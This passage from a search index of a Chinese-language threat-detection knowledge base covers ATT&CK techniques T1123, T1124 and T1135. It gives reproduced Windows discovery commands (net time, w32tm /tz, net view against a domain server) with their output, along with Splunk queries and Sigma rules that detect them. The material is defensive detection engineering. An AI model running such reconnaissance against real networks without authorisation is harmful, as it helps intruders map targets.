<p>https://attack.mitre.org/techniques/T1119/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/","title":"T1123-win-\u97f3\u9891\u6536\u96c6","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8ba1\u7b97\u673a\u7684\u5916\u56f4\u8bbe\u5907\uff08\u4f8b\u5982\uff0c\u9ea6\u514b\u98ce\u548c\u7f51\u7edc\u6444\u50cf\u5934\uff09\u6216\u5e94\u7528\u7a0b\u5e8f\uff08\u4f8b\u5982\uff0c\u8bed\u97f3\u548c\u89c6\u9891\u547c\u53eb\u670d\u52a1\uff09\u6765\u6355\u83b7\u97f3\u9891\u8bb0\u5f55\uff0c\u4ee5\u4fbf\u4fa6\u542c\u654f\u611f\u7684\u5bf9\u8bdd\u4ee5\u6536\u96c6\u4fe1\u606f\u3002</p> <p>\u6076\u610f\u8f6f\u4ef6\u6216\u811a\u672c\u53ef\u80fd\u7528\u4e8e\u901a\u8fc7\u64cd\u4f5c\u7cfb\u7edf\u6216\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u7684\u53ef\u7528API\u4e0e\u8bbe\u5907\u8fdb\u884c\u4ea4\u4e92\u4ee5\u6355\u83b7\u97f3\u9891\u3002\u97f3\u9891\u6587\u4ef6\u53ef\u80fd\u4f1a\u5199\u5165\u78c1\u76d8\u5e76\u5728\u4ee5\u540e\u88ab\u6cc4\u6f0f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>soundrec\u53ef\u4ee5\u901a\u8fc7\u5f00\u53d1\u677f\u91c7\u96c6\u58f0\u97f3\uff0c\u5e76\u901a\u8fc7\u7535\u8111\u7aef\u663e\u793a\u6ce2\u5f62\uff0c\u9002\u7528\u4e8e 5402 dsp\u5f00\u53d1\u677f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>Windows\u5b89\u5168\u65e5\u5fd7\u3001sysmon\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#splunk","title":"splunk\u89c4\u5219","text":"<p>\u7531\u4e8e\u53ef\u80fd\u4f1a\u4f7f\u7528\u5404\u79cdAP\u200b\u200bI\uff0c\u56e0\u6b64\u5f88\u96be\u68c0\u6d4b\u5230\u6b64\u6280\u672f\u3002\u53d6\u51b3\u4e8e\u6b63\u5e38\u4f7f\u7528\u7cfb\u7edf\u7684\u65b9\u5f0f\uff0c\u6709\u5173API\u4f7f\u7528\u7684\u9065\u6d4b\u6570\u636e\u53ef\u80fd\u6ca1\u6709\u7528\uff0c\u4f46\u53ef\u4ee5\u4e3a\u53d1\u751f\u5728\u7cfb\u7edf\u4e0a\u7684\u5176\u4ed6\u6f5c\u5728\u6076\u610f\u6d3b\u52a8\u63d0\u4f9b\u4e0a\u4e0b\u6587\u3002</p> <p>\u53ef\u80fd\u6307\u793a\u6280\u672f\u4f7f\u7528\u7684\u884c\u4e3a\u5305\u62ec\u672a\u77e5\u6216\u5f02\u5e38\u7684\u8fdb\u7a0b\u8bbf\u95ee\u4e0e\u4e0e\u9ea6\u514b\u98ce\uff0c\u5f55\u97f3\u8bbe\u5907\u6216\u5f55\u97f3\u8f6f\u4ef6\u4ea4\u4e92\u7684\u8bbe\u5907\u6216\u8f6f\u4ef6\u76f8\u5173\u8054\u7684API\uff0c\u4ee5\u53ca\u5468\u671f\u6027\u5730\u5c06\u5305\u542b\u97f3\u9891\u6570\u636e\u7684\u6587\u4ef6\u5199\u5165\u78c1\u76d8\u7684\u8fdb\u7a0b\u3002</p> <pre><code>\u201cindex=windows SourceName=\u201d\u201dMicrosoft-Windows-PowerShell\u201d\u201d \u201c\u201d*WindowsAudioDevice-Powershell-Cmdlet*\u201d\u201d //use voice cmdlet in powershell  index=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d (EventCode=1 Image=\u201d\u201d*\\\\explorer.exe\u201d\u201d CommandLine=\u201d\u201d*WindowsSoundRecorder*\u201d\u201d) OR (EventCode=1 Image=\u201d\u201d*\\\\soundrec.exe\u201d\u201d) // soundrecorder started with this command:explorer.exe shell:appsFolder\\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe!App\n\nindex=windows source=\u201d\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d\u201d (EventCode=1 CommandLine=\u201d\u201d*/DURATION*\u201d\u201d) OR (EventCode=1 CommandLine=\u201d\u201d*/FILE*\u201d\u201d) // check all commandlines that used /DURATION and /FILE as a output file in it\u201d\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#_6","title":"\u5efa\u8bae","text":"<p>\u5982\u679c\u4f60\u5bf9windows\u4ee5\u53capowershell\u6bd4\u8f83\u4e86\u89e3\u7684\u8bdd\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528Windows\u65e5\u5fd7\u6765\u5b8c\u6210\u76d1\u89c6\u68c0\u6d4b\uff0c\u5f53\u7136\u6700\u597d\u7684\u65b9\u6cd5\u662f\u4f7f\u7528sysmon\u65e5\u5fd7\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1123-win-%E9%9F%B3%E9%A2%91%E6%94%B6%E9%9B%86/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1123</p> <p>https://attack.mitre.org/techniques/T1123/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/","title":"T1124-\u7cfb\u7edf\u65f6\u95f4\u53d1\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>Windows\u65f6\u95f4\u670d\u52a1\u5728\u57df\u4e2d\u8bbe\u7f6e\u548c\u5b58\u50a8\u7cfb\u7edf\u65f6\u95f4\uff0c\u4ee5\u7ef4\u62a4\u4f01\u4e1a\u7f51\u7edc\u4e2d\u7cfb\u7edf\u548c\u670d\u52a1\u4e4b\u95f4\u7684\u65f6\u95f4\u540c\u6b65\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4ece\u672c\u5730\u6216\u8fdc\u7a0b\u7cfb\u7edf\u6536\u96c6\u7cfb\u7edf\u65f6\u95f4\u6216\u65f6\u533a\u3002\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6765\u6536\u96c6\u6b64\u4fe1\u606f\uff0c\u4f8b\u5982\uff0c\u901a\u8fc7\u5728Windows\u4e0a\u7684Net\u7a0b\u5e8f\u4e0a\u901a\u8fc7\u6267\u884cnet time\u76f8\u5173\u547d\u4ee4\u6765\u8fdb\u884c\u6536\u96c6\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u7684\u7cfb\u7edf\u65f6\u95f4\u3002\u4e5f\u53ef\u4ee5\u4ece\u5f53\u524d\u7cfb\u7edf\u65f6\u95f4\u63a8\u65ad\u53d7\u5bb3\u4eba\u7684\u65f6\u533a\uff0c\u4f7f\u7528\u6536\u96c6w32tm /tz\u3002\u8be5\u4fe1\u606f\u53ef\u80fd\u5bf9\u6267\u884c\u5176\u4ed6\u6280\u672f\u5f88\u6709\u7528\uff0c\u4f8b\u5982\u4f7f\u7528\u8ba1\u5212\u4efb\u52a1\u6267\u884c\u6587\u4ef6\u7b49\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>windows\u4e0b\u5229\u7528net time\u76f8\u5173\u547d\u4ee4\u67e5\u770b\u672c\u5730\u4e3b\u673a\u5f53\u524d\u65f6\u95f4\u3002</p> <pre><code>- \u67e5\u770b\u57df\u65f6\u95f4\u53ca\u57df\u670d\u52a1\u5668\u7684\u540d\u5b57\uff1anet time /domain\n- Nslookup -type=SRV _ldap._tcp.\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Windows\\system32&gt;net time \\\\ICBC\n\\\\ICBC \u7684\u5f53\u524d\u65f6\u95f4\u662f 2019/11/10 20:09:50\n\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n</code></pre> <pre><code>Microsoft Windows [\u7248\u672c 10.0.14393]\n(c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\nC:\\Users\\Administrator&gt;w32tm /tz\n\u65f6\u533a: \u5f53\u524d:TIME_ZONE_ID_UNKNOWN \u504f\u91cf: -480\u5206 (UTC=\u672c\u5730\u65f6\u95f4+Bias)\n  [\u6807\u51c6\u540d\u79f0:\"\u4e2d\u56fd\u6807\u51c6\u65f6\u95f4\" \u504f\u91cf:0\u5206 \u65e5\u671f:(\u672a\u6307\u5b9a)]\n  [\u590f\u65f6\u5236\u540d\u79f0:\"\u4e2d\u56fd\u590f\u4ee4\u65f6\" \u504f\u91cf:-60\u5206 \u65e5\u671f:(\u672a\u6307\u5b9a)]\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u65e5\u5fd7\u30014688\u30014689\u3001\u547d\u4ee4\u884c\u53c2\u6570</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: windows \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0\ndescription: windows server 2016\nreferences:\ntags: T1124\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Newprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: net  time * #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n    selection2:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Newprocessname: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: C:\\Windows\\system32\\net1  time * #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n    selection3:\n        EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b\n        ProcessName: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u540d\n    selection4:\n        EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b\n        ProcessName: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u540d\n    timeframe: last 1m #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574\n    condition: all of them\nlevel: medium\n</code></pre> <pre><code>title: windows \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0\ndescription: windows server 2016\nreferences:\ntags: T1124\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Newprocessname: 'C:\\Windows\\System32\\w32tm.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: w32tm  /tz #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n    selection2:\n        EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b\n        ProcessName: 'C:\\Windows\\System32\\w32tm.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u540d\n    timeframe: last 5s #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574\n    condition: all of them\nlevel: medium\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1124-win-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E5%8F%91%E7%8E%B0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1124</p> <p>https://attack.mitre.org/techniques/T1124/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/","title":"T1135-win-\u7f51\u7edc\u5171\u4eab\u53d1\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u7f51\u7edc\u901a\u5e38\u5305\u542b\u5171\u4eab\u7684\u7f51\u7edc\u9a71\u52a8\u5668\u548c\u6587\u4ef6\u5939\uff0c\u4f7f\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\u4e0d\u540c\u7cfb\u7edf\u4e0a\u7684\u6587\u4ef6\u76ee\u5f55\u3002</p> <p>windows Windows\u7f51\u7edc\u4e0a\u7684\u6587\u4ef6\u5171\u4eab\u901a\u8fc7SMB\u534f\u8bae\u8fdb\u884c\u3002 Net\u53ef\u7528\u4e8e\u4f7f\u7528Net view\\remote system\u547d\u4ee4\u67e5\u8be2\u8fdc\u7a0b\u7cfb\u7edf\u4e2d\u7684\u53ef\u7528\u5171\u4eab\u9a71\u52a8\u5668\u3002\u5b83\u8fd8\u53ef\u7528\u4e8e\u4f7f\u7528\u7f51\u7edc\u5171\u4eab\u67e5\u8be2\u672c\u5730\u7cfb\u7edf\u4e0a\u7684\u5171\u4eab\u9a71\u52a8\u5668\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5bfb\u627e\u5728\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u5171\u4eab\u7684\u6587\u4ef6\u5939\u548c\u9a71\u52a8\u5668\uff0c\u4f5c\u4e3a\u8bc6\u522b\u4fe1\u606f\u6e90\u7684\u4e00\u79cd\u65b9\u6cd5\uff0c\u4ee5\u6536\u96c6\u4f5c\u4e3a\u653b\u51fb\u7684\u524d\u5146\uff0c\u5e76\u8bc6\u522b\u53ef\u80fd\u611f\u5174\u8da3\u7684\u6a2a\u5411\u79fb\u52a8\u7cfb\u7edf\u3002</p> <p>Mac \u5728Mac\u4e0a\uff0c\u53ef\u4ee5\u4f7f\u7528df-aH\u547d\u4ee4\u67e5\u770b\u672c\u5730\u5b89\u88c5\u7684\u5171\u4eab\u3002</p> <p>\u4e91 \u4e91\u865a\u62df\u7f51\u7edc\u53ef\u80fd\u5305\u542b\u8fdc\u7a0b\u7f51\u7edc\u5171\u4eab\u6216\u6587\u4ef6\u5b58\u50a8\u670d\u52a1\uff0c\u653b\u51fb\u8005\u5728\u83b7\u5f97\u5bf9\u7cfb\u7edf\u7684\u8bbf\u95ee\u6743\u9650\u540e\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u4e9b\u670d\u52a1\u3002\u4f8b\u5982\uff0cAWS\u3001GCP\u548cAzure\u652f\u6301\u521b\u5efa\u7f51\u7edc\u6587\u4ef6\u7cfb\u7edf\uff08NFS\uff09\u5171\u4eab\u548c\u670d\u52a1\u5668\u6d88\u606f\u5757\uff08SMB\uff09\u5171\u4eab\uff0c\u8fd9\u4e9b\u5171\u4eab\u53ef\u4ee5\u6620\u5c04\u5230\u7aef\u70b9\u6216\u57fa\u4e8e\u4e91\u7684\u7cfb\u7edf\u4e0a</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>windows \u672c\u5730\u6267\u884cnet view\u76f8\u5173\u547d\u4ee4</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Windows\\system32&gt;net view \\\\OWA2010SP3.0day.org\n\u5728 \\\\OWA2010SP3.0day.org \u7684\u5171\u4eab\u8d44\u6e90\n\n\n\n\u5171\u4eab\u540d        \u7c7b\u578b  \u4f7f\u7528\u4e3a  \u6ce8\u91ca\n\n-------------------------------------------------------------------------------\nAddress       Disk          \"Access to address objects\"\nCertEnroll    Disk          Active Directory \u8bc1\u4e66\u670d\u52a1\u5171\u4eab\nExchangeOAB   Disk          OAB Distribution share\nGroupMetrics  Disk          \u90ae\u4ef6\u63d0\u793a\u7ec4\u5ea6\u91cf\u6807\u51c6\u53d1\u5e03\u70b9\nNETLOGON      Disk          Logon server share\nSYSVOL        Disk          Logon server share\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: windows \u7f51\u7edc\u5171\u4eab\u53d1\u73b0\uff08windows server 2016\uff09\u68c0\u6d4b\ndescription: windows server 2016\u3001windows server 2012\u3001\u57df\u73af\u5883\ntags: T1135\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Newprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: net  view \\\\* #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u547d\u4ee4\u884c\n    selection2:\n        EventID: 4703 #\u5df2\u8c03\u6574\u7528\u6237\u6743\u5229\u3002\u6ce8\u610f\u6b64\u4e8b\u4ef6\u5728windows server 2016\u4ee5\u4e0a\u7cfb\u7edf\u542f\u7528\n    selection3:\n        EventID: 5158 #Windows \u7b5b\u9009\u5e73\u53f0\u5df2\u5141\u8bb8\u7ed1\u5b9a\u672c\u5730\u7aef\u53e3\u3002\u6ce8\u610f\u6e90\u7aef\u53e3\u3001\u534f\u8bae\n    selection4:\n        EventID: 5156 #Windows \u7b5b\u9009\u5e73\u53f0\u5df2\u5141\u8bb8\u8fde\u63a5\u3002\n        Direction: \u51fa\u7ad9 #\u7f51\u7edc\u4fe1\u606f&gt;\u65b9\u5411\uff1a\u51fa\u7ad9\n        Sourceaddress: * #\u53d1\u8d77\u67e5\u8be2\u4e3b\u673aIP\u5730\u5740\n        Sourceport: * #\u548c5158\u4e8b\u4ef6\u6e90\u7aef\u53e3\u4e00\u81f4\n        Targetaddress: * #\u76ee\u6807IP\u5730\u5740\n        Targetport: 445 #\u76ee\u6807\u7aef\u53e3\n        Agreement: * #\u534f\u8bae\uff0c\u534f\u8bae\u548c5158\u4e00\u81f4\n    selection5:\n        EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b\u3002\n        Processname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u540d\n    timeframe: last 5s #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574\n    condition: all of them\nlevel: medium\n</code></pre> <pre><code>title: windows \u7f51\u7edc\u5171\u4eab\u53d1\u73b0\uff08windows server 2012\uff09\u68c0\u6d4b\ndescription: windows server 2016\u3001windows server 2012\u3001\u57df\u73af\u5883\ntags: T1135\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 5156 #Windows \u7b5b\u9009\u5e73\u53f0\u5df2\u5141\u8bb8\u8fde\u63a5\u3002\n        Direction: \u5165\u7ad9 #\u7f51\u7edc\u4fe1\u606f&gt;\u65b9\u5411\uff1a\u5165\u7ad9\n        Sourceaddress: * #\u88ab\u67e5\u8be2\u4e3b\u673aIP\u5730\u5740\n        Sourceport: 445\n        Targetaddress: * #\u76ee\u6807\u5730\u5740 \u53d1\u8d77\u67e5\u8be2\u7684\u4e3b\u673aIP\u5730\u5740\n        Targetport: * #\u76ee\u6807\u7aef\u53e3 \u53d1\u8d77\u67e5\u8be2\u7684\u4e3b\u673aIP\u7aef\u53e3\n        Agreement: * #\u534f\u8bae\uff0c\u548c2016\u4e0a5156\u4e8b\u4ef6\u30015158\u4e8b\u4ef6\u6d89\u53ca\u7684\u534f\u8bae\u4e00\u81f4\n    selection2:\n        EventID: 4702 #\u4e3a\u65b0\u767b\u5f55\u5206\u914d\u4e86\u7279\u6b8a\u6743\u9650\u3002\n    selection3:\n        EventID: 4624 #\u5df2\u6210\u529f\u767b\u5f55\u5e10\u6237\u3002\n        logontype: 3 #\u767b\u9646\u7c7b\u578b\u4e3a3\n        Sourcenetworkaddress: * #\u7f51\u7edc\u4fe1\u606f&gt;\u6e90\u7f51\u7edc\u5730\u5740 \u540c\u4e0a5156\u76ee\u6807\u5730\u5740\n        Sourceport: * #\u7f51\u7edc\u4fe1\u606f&gt;\u6e90\u7f51\u7edc\u7aef\u53e3 \u540c\u4e0a5156\u76ee\u6807\u7aef\u53e3\n        Loginprocess: Kerberos #\u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f&gt;\u767b\u5f55\u8fdb\u7a0b\n        Authenticationpackage: Kerberos #\u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f&gt;\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5305\n    selection4:\n        EventID: 5140 #\u5df2\u8bbf\u95ee\u7f51\u7edc\u5171\u4eab\u5bf9\u8c61\u3002\n        Objecttype: file #\u7f51\u7edc\u4fe1\u606f&gt;\u5bf9\u8c61\u7c7b\u578b\n        Sourceaddress: * #\u7f51\u7edc\u4fe1\u606f&gt;\u6e90\u5730\u5740 \u540c\u4e0a5156\u76ee\u6807\u5730\u5740\n        Sourceport: * #\u7f51\u7edc\u4fe1\u606f&gt;\u6e90\u7aef\u53e3 \u540c\u4e0a5156\u76ee\u6807\u7aef\u53e3\n        Sharename: \\\\*\\IPC$ #\u5171\u4eab\u4fe1\u606f&gt;\u5171\u4eab\u540d\n    selection5:\n        EventID: 5140 #\u5df2\u8bbf\u95ee\u7f51\u7edc\u5171\u4eab\u5bf9\u8c61\u3002\n        Objecttype: file #\u7f51\u7edc\u4fe1\u606f&gt;\u5bf9\u8c61\u7c7b\u578b\n        Sourceaddress: * #\u7f51\u7edc\u4fe1\u606f&gt;\u6e90\u5730\u5740 \u540c\u4e0a5156\u76ee\u6807\u5730\u5740\n        Sourceport: * #\u7f51\u7edc\u4fe1\u606f&gt;\u6e90\u7aef\u53e3 \u540c\u4e0a5156\u76ee\u6807\u7aef\u53e3\n        Sharename: \\\\*\\IPC$ #\u5171\u4eab\u4fe1\u606f&gt;\u5171\u4eab\u540d\n        Relativetargetname: srvsvc #\u5171\u4eab\u4fe1\u606f&gt;\u76f8\u5bf9\u76ee\u6807\u540d\u79f0\n    timeframe: last 10s #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574\n    condition: all of them\nlevel: medium\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1135-win-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0/#_6","title":"\u5efa\u8bae","text":"<p>\u6ce8\u610f: \u8fd9\u91cc\u7684\u7aef\u53e3\u3001IP\u53ca\u534f\u8bae\u7528\u4e8e\u4e8b\u4ef6\u76f8\u4e92\u5173\u8054\uff0c\u4e0d\u505a\u5176\u4ed6\u7528\u5904</p> <p>\u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u53d1\u751f\u5728\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u7684\u6574\u4e2a\u884c\u52a8\u4e2d\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u6839\u636e\u83b7\u5f97\u7684\u4fe1\u606f\uff0c\u5c06\u5176\u89c6\u4e3a\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u6d3b\u52a8\uff08\u5982\u6a2a\u5411\u8fd0\u52a8\uff09\u7684\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\u3002 